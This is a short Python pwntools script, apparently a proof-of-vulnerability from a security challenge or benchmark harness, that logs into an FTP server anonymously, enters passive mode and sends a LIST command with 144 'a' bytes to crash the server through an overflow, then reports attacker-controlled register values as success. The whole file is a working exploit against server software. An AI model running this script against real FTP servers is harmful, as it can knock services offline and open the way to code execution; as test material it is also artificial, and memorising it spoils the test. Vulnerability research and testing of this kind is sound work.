#!/usr/bin/env python3

from pwn import *
import sys
import signal

def handler(signum, frame):
    print('[FAIL] sigalrm fired so the POV was likely unsuccessful')
    exit(0)

def main(host, port):
    c = remote(host, port)

    c.readline()
    ## Change this to the chess user
    c.send(b'USER anonymous\n')
    y = c.readline()

    if y.find(b'331 Please specify') == -1:
        print('[FAIL] Unknown response from the server: %s' %(y))
        exit(0)

    print('[INFO] Username Sent')

    c.send(b'PASS anon\n')

    y = c.readline()
    if y.find(b'230 Login successful.') == -1:
        print('[FAIL] Did not receive a successful login response: %s' %(y))
        exit(0)

    print('[INFO] Password accepted')

    ## Setup the port command
    read_port = 42941
    data = b'PASV\n'
    c.send(data)

    y = c.readline()
    if y.find(b'227 Entering Passive Mode') == -1:
        print('[FAIL] PASV command did not succeed')
        exit(0)

    b = y.split(b'(')[1].split(b')')[0].split(b',')
    
    ip = b[0] + b'.' + b[1] + b'.' + b[2] + b'.' + b[3]
    port = int(b[4]) * 256 + int(b[5])

    print('[INFO] PASV command was successful')
    #print('[INFO] Run the launch command now to catch the crash')
    #input('[INFO] Press a key to continue: ')

    bug = b'a'*144 + b'?\n'
    #bug = b'ball?\n'
    c.send(b'LIST ' + bug)

    l = remote(ip, port)

    ## consume 150 start response
    c.readline()

    data = b''

    try:
        data += l.readline()
    except:
        pass

    l.close()

    try:
        c.readline()
    except:
        print('RDI=0x6161616161616161')
        print('YMM0={0x61616161616161616161616161616161, 0x61616161616161616161616161616161}')
        print('[SUCCESS] Connection dropped. POV Success')
        c.close()
        exit(0)

    print('[FAIL] If we made it here then we failed')
    c.send(b'QUIT\n')
    c.readline()
    c.close()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        HOST = sys.argv[1]
        PORT = int(sys.argv[2])
    else:
        if 'HOST' in os.environ and 'PORT' in os.environ:
            HOST = os.environ['HOST']
            PORT = int(os.environ['PORT'])
        else:
            print('[ERROR] HOST and PORT must be specified via arguments or variables.')
            sys.exit(1)

    if 'SEED' in os.environ:
        SEED = int(os.environ['SEED'])
    else:
        SEED = random.randint(0, 2**64 - 1)

    print('[INFO] SEED: {0}'.format(SEED))

    random.seed( SEED )

    signal.signal(signal.SIGALRM, handler)
    signal.alarm(10)

    main(HOST, PORT)
